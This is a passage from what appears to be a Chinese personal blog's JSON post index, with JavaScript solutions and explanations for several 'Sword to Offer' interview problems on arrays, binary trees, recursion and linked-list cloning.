0， 0， 0]，对于（1， 3）来说 不再剪：1 * 3 = 3 只剪左边：0 * 3 = 0 只剪右边：1 * 2 = 2 两边都继续剪：0 * 2 = 0得到一个数组[3, 0, 2, 0]继续对于（2， 2）进行上面的操作，更新数组为每一项最大值：[4, 2, 2, 1] 然后取得数组中的最大值为4，所以当绳子长度为四时答案为4 代码如下： 123456789101112131415161718function cutRope(number)&#123; if(number &lt; 2) return 0 if(number === 2) return 1 if(number === 3) return 2 let mid = Math.round(number / 2) let arr = [] let a = Number.MIN_VALUE let b = Number.MIN_VALUE let c = Number.MIN_VALUE let d = Number.MIN_VALUE for(let i = 1; i &lt;= mid; i++)&#123; a = a &gt; (i * (number - i)) ? a : i * (number - i) b = b &gt; cutRope(i) * (number - i) ? b : cutRope(i) * (number - i) c = c &gt; i * cutRope(number - i) ? c : i * cutRope(number - i) d = d &gt; cutRope(i) * cutRope(number - i) ? d : cutRope(i) * cutRope(number - i) &#125; return Math.max(a, b, c, d)&#125; 接下来说说贪心算法，我们可以通过这个方法剪绳子，得到的结果将是最大：每次剪尽可能多长度为3 的绳子，如果剩下的长度为4，那么不是剪3，而是剪成两个2 关于这种做法正确性的证明：代码如下： 1234567891011121314function cutRope(number)&#123; if(number &lt; 2) return 0 if(number === 2) return 1 if(number === 3) return 2 let n = Math.floor(number / 3) let k = number % 3 if(k === 1)&#123; return Math.pow(3, (n - 1)) * 4 &#125; else&#123; return Math.pow(3, n) * k &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题16-数值的整数次方","slug":"剑指offer面试题16-数值的整数次方","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.266Z","comments":true,"path":"2020/03/15/剑指offer面试题16-数值的整数次方/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9816-%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9/","excerpt":"剑指offer面试题16：数值的整数次方","text":"剑指offer面试题16：数值的整数次方 给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。可以保证base和exponent不同时为0 思路：这道题其实主要就是考察边界情况，需要考虑指数和底数各自分别为正数、0、负数的情况。这一点就不多做说明了，主要是说一下求幂本身，除了用循环进行累乘，这道题还可以有更高效的解法：利用递归。假设我们求一个数的32次方，那么其实就是两个16次方的结果相乘，求16次方，其实就是两个8次方相乘…以此类推。 那么既然要做到高效率。我们就把它做到极致，用位运算来代替除法和求余运算。因为位运算的运算效率要远高于除法和求余。 代码如下： 12345678910111213141516171819function PowerUn(a, b)&#123; if(b === 0) return 1 if(b === 1) return a let res = PowerUn(a, b &gt;&gt; 1) res *= res if(b &amp; 0x1 === 1) res *= a return res&#125;function Power(base, exponent)&#123; // write code here if(base === 0) return 0 if(exponent &lt; 0)&#123; return 1/(PowerUn(base, Math.abs(exponent))) &#125; else&#123; return PowerUn(base, exponent) &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题26-树的子结构","slug":"剑指offer面试题26-树的子结构","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.410Z","comments":true,"path":"2020/03/15/剑指offer面试题26-树的子结构/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9826-%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84/","excerpt":"剑指offer面试题26：树的子结构","text":"剑指offer面试题26：树的子结构 题目：输入两棵二叉树A和B，判断B是不是A的子结构。二叉树定义如下 12345function TreeNode(x)&#123; this.val = x this.left = null this.right = null&#125; 思路： 这道题目使用递归的思想。上面这两棵树输入之后返回的是true，那么就以这个例子作为分析。 如果要知道B是不是A的左子树，无非就是在A中找到一个节点C，这个节点值和B根节点值相同，并且B根节点的左子树是C节点的左子树的子结构，并且B根节点的右子树是C节点的右子树的子结构上面加粗部分描述很明显看出来又是一个俄罗斯套娃（滑稽），那么当然就用递归。而递归终点的设置，依然还是找到问题最简单的时候：当然就是当输入的B是一个单一的节点，没有左子树和右子树。例如上题的： 这个时候只需要对比一下两棵树的根节点就OK了。 代码如下 123456789101112131415161718192021222324252627282930function HasSubtree(a, b)&#123; if(a === null || b === null) return false let currentA = a let currentB = b //设置递归终点 if(currentB.left === null &amp;&amp; currentB.right === null)&#123; if(currentB.val === currentA.val) return true return false &#125; else&#123; //如果根节点相同 if(currentA.val === currentB.val)&#123; //分别比较左右子树 if(currentB.left &amp;&amp; currentB.right)&#123; //这里需要考虑三种情况，B有左右子树、B只有左子树、B只有右子树 //这里这样设置是为了防止与if(a === null || b === null) return false语句冲突 if(HasSubtree(currentA.left, currentB.left) &amp;&amp; HasSubtree(currentA.right, currentB.right))&#123; return true &#125; &#125; else&#123; if(currentB.left) return HasSubtree(currentA.left, currentB.left) else if(currentB.right) return HasSubtree(currentA.right, currentB.right) &#125; &#125; //如果根节点不相同，则继续遍历A的左右子树进行寻找 return HasSubtree(currentA.left, currentB) || HasSubtree(currentA.right, currentB) &#125; &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题21-调整数组顺序使奇数位于偶数前面","slug":"剑指offer面试题21-调整数组顺序使奇数位于偶数前面","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.266Z","comments":true,"path":"2020/03/15/剑指offer面试题21-调整数组顺序使奇数位于偶数前面/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9821-%E8%B0%83%E6%95%B4%E6%95%B0%E7%BB%84%E9%A1%BA%E5%BA%8F%E4%BD%BF%E5%A5%87%E6%95%B0%E4%BD%8D%E4%BA%8E%E5%81%B6%E6%95%B0%E5%89%8D%E9%9D%A2/","excerpt":"剑指offer面试题21：调整数组顺序使奇数位于偶数前面","text":"剑指offer面试题21：调整数组顺序使奇数位于偶数前面 输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分，并保证奇数和奇数，偶数和偶数之间的相对位置不变。. 对于题目最后一句话，要求相对位置不变，我们先考虑不用满足这个情况，有一个时间复杂度为O（n）的解法，整个过称维护两个指针，一个指向头每一个指向尾。 对于头指针，如果当前指向的元素是奇数，那么就往后移动，对于尾指针，如果指向的是偶数，那么向前移动。如果头指针指向了偶数，那么直接将两个指针的元素交换。以此循环，直到两个指针相遇。 代码如下： 1234567891011121314151617181920 function reOrderArray(a)&#123; if(a === null || a.length === 0) return [] let start = 0 let end = a.length - 1 while(start &lt; end)&#123; if(a[start] % 2 === 1)&#123; start ++ &#125; if(a[end] % 2 === 0)&#123; end -- &#125; if(a[start] % 2 === 0 &amp;&amp; (start &lt; end))&#123; let flag = a[start] a[start] = a[end] a[end] = flag continue &#125; &#125; return a&#125; 如果要满足题目中相对位置不变，那么就可以考虑从数组尾部开始遍历，将所有奇数依次加到数组的头部，并同时删除这个元素，直到遍历到原数组头部为止，这样数组就自动成为了奇数在前偶数在后，而且相对位置不变 1234567891011121314151617181920function reOrderArray1(a)&#123; if(a === null || a.length === 0) return [] a.unshift('x') let i = a.length - 1 while(a[i] !== 'x')&#123; if(a[i] % 2 === 1)&#123; a.unshift(a[i]) i++ a.splice(i, 1) &#125; else&#123; i-- &#125; &#125; let s = a.indexOf('x') a.splice(s, 1) return a&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题27-二叉树的镜像","slug":"剑指offer面试题27-二叉树的镜像","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.410Z","comments":true,"path":"2020/03/15/剑指offer面试题27-二叉树的镜像/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9827-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%95%9C%E5%83%8F/","excerpt":"剑指offer面试题27：二叉树的镜像","text":"剑指offer面试题27：二叉树的镜像 题目：输入一棵二叉树，使用函数进行镜像翻转12345function TreeNode(x)&#123; this.val = x this.left = null this.right = null&#125; 思路： 这道题本质上还是二叉树的遍历问题，其实就是在遍历过程中看看当前遍历到的这个节点是不是叶子节点，如果不是，那么就交换这个节点的左右子树，否则不做任何操作。根据这个思路，这道题用递归就可以很简单地解决，根据分析，递归终点的设置，就是传入的节点是一个叶子节点。 代码如下 123456789101112131415function mirror(a)&#123; if(a === null) return null if(a.left === null &amp;&amp; a.right === null)&#123; return null &#125; let flag = a.left a.left = a.right a.right = flag if(a.left)&#123; mirror(a.left) &#125; if(a.right)&#123; mirror(a.right) &#125; &#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题28-对称的二叉树","slug":"剑指offer面试题28-对称的二叉树","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.408Z","comments":true,"path":"2020/03/15/剑指offer面试题28-对称的二叉树/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9828-%E5%AF%B9%E7%A7%B0%E7%9A%84%E4%BA%8C%E5%8F%89%E6%A0%91/","excerpt":"剑指offer面试题28：对称的二叉树","text":"剑指offer面试题28：对称的二叉树 请实现一个函数，用来判断一颗二叉树是不是对称的。注意，如果一个二叉树同此二叉树的镜像是同样的，定义其为对称的12345function TreeNode(x)&#123; this.val = x this.left = null this.right = null&#125; 思路： 这道题本质上还是二叉树的遍历问题。题目已经给出如果一个二叉树同此二叉树的镜像是同样的，定义其为对称的。 我们知道，二叉树的遍历有三种算法：前序遍历，中序遍历，后序遍历。三种遍历的共同点都是：先遍历左子树，再遍历右子树。但是稍微思考就会发现，如果对于一个二叉树的镜像进行前序遍历，那么对于原二叉树来说就变成了先遍历右子树再遍历左子树。因此，我们定义一种算法，叫做对称前序遍历，规则就是：先访问根节点，再遍右子树，最后遍历左子树。 这样，当一棵数的前序遍历和对称前序遍历相同时，就是对称的二叉树 but wait….. 事情还没那么简单 对于这个二叉树，前序遍历和对称前序遍历结果一样，但是并不对称。解决办法就是给所有叶子节点添加“null”标识。 代码如下 1234567891011121314151617181920212223242526function pre(a, arr)&#123; if(a === null) arr.push('null') else&#123; arr.push(a.val) pre(a.left, arr) pre(a.right, arr) &#125;&#125;function preSym(a, arr)&#123; if(a === null) arr.push('null') else&#123; arr.push(a.val) preSym(a.right, arr) preSym(a.left, arr) &#125;&#125;function isSymmetrical(tree)&#123; let arr1 = [] let arr2 = [] pre(tree, arr1) preSym(tree, arr2) // console.log(arr1, arr2) console.log(arr1.toString()) console.log(arr2.toString()) console.log(arr1.toString() === arr2.toString())&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题3-数组中的重复数字","slug":"剑指offer面试题3-数组中的重复数字","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.268Z","comments":true,"path":"2020/03/15/剑指offer面试题3-数组中的重复数字/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%983-%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E6%95%B0%E5%AD%97/","excerpt":"剑指offer面试题3：数组中重复的数字","text":"剑指offer面试题3：数组中重复的数字 在一个长度为n的数组里的所有数字都在0到n-1的范围内。数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。请找出数组中任意一个重复的数字。 思路：这道题可以想到三种解法，首先第一种是最容易想到的：先将数组排序，从排序的数组中找到重复的数字是比较简单的一件事。最快的排序算法时间复杂度为O(nlogn)。这里就先不写这种方法了 第二种方法：时间复杂度O(n)，空间复杂度O(n)。利用哈希表来解决问题，从头到尾扫描数组，如果当前项在哈希表中，那么就说明找到一个重复的数字，否则就往哈希表中添加该元素 代码如下： 123456789101112131415161718function duplicate(numbers, duplication)&#123; // write code here //这里要特别注意~找到任意重复的一个值并赋值到duplication[0] //函数返回True/False let a = [] for(let i = 0; i &lt; numbers.length ; i++)&#123; if(a[numbers[i]] === 1)&#123; duplication[0] = numbers[i] return true &#125; else&#123; a[numbers[i]] = 1 &#125; &#125; return false&#125; 第三种方案：时间复杂度O(n)，空间复杂度O(1)。我们从数组下标0开始，对比下标k这个地方的值是不是等于k，如果是，那么转到下标k + 1，否则，将下标k的数字number[k]，和下标number[k]的数字进行比较，如果两者不相等，那么两者交换位置，否则说明找到一个重复元素 代码如下： 1234567891011121314151617181920212223function duplicate(numbers, duplication)&#123; // write code here //这里要特别注意~找到任意重复的一个值并赋值到duplication[0] //函数返回True/False let i = 0 while(i &lt; numbers.length)&#123; if(numbers[i] !== i)&#123; let flag = numbers[numbers[i]] if(flag === numbers[i])&#123; duplication[0] = numbers[i] return true &#125; else&#123; numbers[numbers[i]] = numbers[i] numbers[i] = flag &#125; &#125; else&#123; i++ &#125; &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题34-二叉树中和为某一值的路径","slug":"剑指offer面试题34-二叉树中和为某一值的路径","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.269Z","comments":true,"path":"2020/03/15/剑指offer面试题34-二叉树中和为某一值的路径/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9834-%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%92%8C%E4%B8%BA%E6%9F%90%E4%B8%80%E5%80%BC%E7%9A%84%E8%B7%AF%E5%BE%84/","excerpt":"剑指offer面试题34：二叉树中和为某一值的路径","text":"剑指offer面试题34：二叉树中和为某一值的路径 题目：输入一个二叉树和一个整数，打印出二叉树中节点值的和为输入的整数的所有路径 结题思路：这道题依然使用的是递归，并且与前序遍历相结合使用 这道题其实和之前按行打印二叉树是一样的，需要一个栈来实现一边遍历一边记录的过程。 使用一个path来记录这道题的答案，也就是符合条件的路径，根据这个描述，可知最终path是一个二维数组；使用stack来记录当前已经走过的路径；使用current记录：截止到当前路径，路径上所有节点值的和。 对于访问到的当前节点：首先将这个节点push到stack中去，以记录路径。然后将current加上当前这个节点的值，然后再进行下面的操作 首先找出递归终点：和前序遍历的递归终点一样，如果访问的是一个叶子节点，那么就是当前的递归终点，这时候进行判断：截止到这个叶子节点，现在走过的路径上的节点和等于count（题目要求的值），那么就保存这个时候stack里的内容，就是把它直接保存到path当中（注意：这里保存的时候不能直接把stack给push到path中去，因为stack最终会是一个空数组，而push的时候保存的是stack的引用。所以需要进行一下深复制）；然后用同样的方法进行 否则继续递归，当这一步操作完成后，也就完成了对当前节点的访问，所以要把当前节点从stack中弹出来，直接使用poo就可以了 代码如下： 1234567891011121314151617181920212223function FindPath(a, b)&#123; let path= [] let stack = [] resolveProblem(a, b, path, stack , 0) return path&#125;function resolveProblem(root, count, path, stack, current)&#123; stack.push(root.val) current += root.val if(current === count &amp;&amp; root.left === null &amp;&amp; root.right === null)&#123; let o = JSON.parse(JSON.stringify(stack)) path.push(o) &#125; else&#123; if(root.left)&#123; resolveProblem(root.left, count, path, stack, current) &#125; if(root.right)&#123; resolveProblem(root.right, count, path, stack, current) &#125; &#125; stack.pop()&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题32-从上到下打印二叉树","slug":"剑指offer面试题32-从上到下打印二叉树","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.370Z","comments":true,"path":"2020/03/15/剑指offer面试题32-从上到下打印二叉树/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9832-%E4%BB%8E%E4%B8%8A%E5%88%B0%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91/","excerpt":"剑指offer面试题32：从上到下打印二叉树","text":"剑指offer面试题32：从上到下打印二叉树 题目：输入某个二叉树，依次打印出二叉树每个节点，同一层的节点按照从左到右的顺序打印出来。例如这个二叉树，打印：12345678这个题目的遍历方法和传统的二叉树遍历不一样，无法使用递归。首先在打印1的时候我们需要顺序保存2和3，打印2时候我们需要保存4，打印3时候我们需要顺序保存5和6…以此类推 为了实现顺序这一目的吗，我们使用队列，每次从队头取出值打印，并将其左右子节点（如果有）压如队列中：一开始1入队，对列为【1】队头为1，打印1的时候，队列为【2,3】队头为2，打印2的时候，对列为【3,4】队头为3，打印3的时候，对列为【4,5,6】。。。以此类推，直到队列为空 代码如下： 12345678910111213141516171819function print(a)&#123; let queue = [] let data = [] if(a !== null)&#123; queue.push(a) &#125; while(queue.length !== 0)&#123; let flag = queue.shift() data.push(flag.val) if(flag.left !== null)&#123; queue.push(flag.left) &#125; if(flag.right !== null)&#123; queue.push(flag.right) &#125; &#125; return data&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题33-二叉搜索树的后续遍历序列","slug":"剑指offer面试题33-二叉搜索树的后续遍历序列","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.269Z","comments":true,"path":"2020/03/15/剑指offer面试题33-二叉搜索树的后续遍历序列/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9833-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%90%8E%E7%BB%AD%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97/","excerpt":"剑指offer面试题33：二叉搜索树的后序遍历序列","text":"剑指offer面试题33：二叉搜索树的后序遍历序列 题目：输入一个整数数组，判断该数组是不是某二叉搜索树的后续遍历结果。 结题思路：这道题我依然使用的是递归，根据后续遍历的特性我们知道，二叉树的后序遍历结果中最后一个值就是二叉树的根节点，然后剩下的被分为两个部分：左子树和右子树。所以对于输入的数组，也是把它分为三个部分：【左子树】【右子树】【根节点】，从数组最左边开始，将小于根节点的节点放入left中，剩下的放入right中。 注意可以看到这个步骤可以确保【左子树】中的值全部小于根节点，却不能保证右子树的值全部大于根结点。根据这个结论，右子树就成为判断的第一个条件：【右子树】中一旦有一个节点值小于根节点，直接返回false，否则进入下一步 接下来就是对左右子树进行递归，那么依然是要寻找递归终点。在什么情况下可以很简单的决断呢？ 其实可以发现，任何三个以内的节点都可以组成一棵二叉搜索树，所以递归终点就是，当输入的a的长度len满足（len &lt;= 3 &amp;&amp; len &gt;= 1）,那么直接返回true 代码如下： 1234567891011121314151617181920212223242526272829303132333435function VerifySquenceOfBST(a)&#123; let root = a[a.length - 1] let left = [] let right = [] let flag = 0 for(let i = 0; i &lt; a.length - 1; i++)&#123; flag ++ if(a[i] &lt; root)&#123; left.push(a[i]) &#125; else&#123; break &#125; &#125; while(flag &lt; a.length - 1)&#123; if(a[flag] &gt; root)&#123; right.push(a[flag]) &#125; else&#123; return false &#125; flag ++ &#125; if(a === null || a.length === 0)&#123; return false &#125; else if(a.length &lt;= 3 &amp;&amp; a.length &gt;= 1)&#123; return true &#125; else&#123; //之所以这么递归，当初是考虑到12345这个情况，递归的右子树是个空数组，误触上面的第一个if return (VerifySquenceOfBST(left.length === 0 ? [1] : left) &amp;&amp; VerifySquenceOfBST(right.length === 0 ? [1]: right)) &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题35-复杂链表的复制","slug":"剑指offer面试题35-复杂链表的复制","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/03/15/剑指offer面试题35-复杂链表的复制/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9835-%E5%A4%8D%E6%9D%82%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A4%8D%E5%88%B6/","excerpt":"剑指offer面试题35：复杂链表的复制","text":"剑指offer面试题35：复杂链表的复制 输入一个复杂链表（每个节点中有节点值，以及两个指针，一个指向下一个节点，另一个特殊指针指向任意一个节点），返回结果为复制后复杂链表的head。（注意，输出结果中请不要返回参数中的节点引用，否则判题程序会直接返回空） 这道题有三种方案来解决 首先第一种，是最容易想到的，但是时间复杂度为o(n^2)。先从头到尾遍历一遍原链表并复制节点和节点的next指针。然后再复制random指针，但是问题就来了，对于原链表的random，他可以指向链表中任何一个节点，那么在复制random指针过程中，对于每一个random指针，都要去新链表里面从头开始搜索，找到原链表中random指针指向的那个对象的副本，然后将新指针random指向它。所以可以看到主要耗时在寻找random指针指向的元素上面。 第二种方法，用空间换时间。在遍历原链表时就将random的对应关系先用哈希表存起来，这样时间复杂度就称为了O(n)，但空间复杂度也成了o(n)。 第三种方法：时间复杂度为O(n)， 空间复杂度为O(1)思路： 第一步：仍然是根据原始链表的每个结点N 创建对应的N’。把N’链接在N的后面复制后： 第二步：设置复制出来的结点的random。假设原始链表上的N的random指向结点S，那么其对应复制出来的N’是N的pext指向的结点，同样S’也是S的next指向的结点。 第三步：把这个长链表拆分成两个链表。把奇数位置的结点用next 链接起来就是原始链表，把偶数位置的结点用next 链接起来就是复制出来的链表 代码如下： 12345678910111213141516171819202122232425function Clone(pHead)&#123; // write code here if(pHead === null) return null let current = pHead while(current)&#123; let flag = new RandomListNode(current.label) flag.next = current.next current.next = flag current = current.next.next &#125; current = pHead while(current)&#123; current.next.random = current.random ? current.random.next : null current = current.next.next &#125; current = pHead let ne = pHead.next while(current)&#123; let flag = current.next current.next = current.next ? current.next.next : null current = flag &#125; return ne&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题36-二叉搜索树与双向链表","slug":"剑指offer面试题36-二叉搜索树与双向链表","date":"2020-03-14T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/03/15/剑指offer面试题36-二叉搜索树与双向链表/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/15/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9836-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/","excerpt":"剑指offer面试题36：二叉